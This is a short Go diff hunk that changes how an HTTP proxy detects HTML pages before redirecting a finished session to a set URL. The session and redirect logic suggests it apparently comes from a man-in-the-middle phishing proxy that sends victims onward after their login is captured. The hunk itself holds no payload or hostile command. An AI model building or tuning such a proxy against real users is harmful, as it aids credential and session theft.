@@ -1226,7 +1226,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				s, ok := p.sessions[ps.SessionId]
 				if ok && s.IsDone {
 					if s.RedirectURL != "" && s.RedirectCount == 0 {
-						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && stringExists(string(body), []string{"<head>", "<body>"}) {
+						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Index(string(body), "</head>") >= 0 || strings.Index(string(body), "</body>") >= 0) {
 							// redirect only if received response content is of `text/html` content type
 							s.RedirectCount += 1
 							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
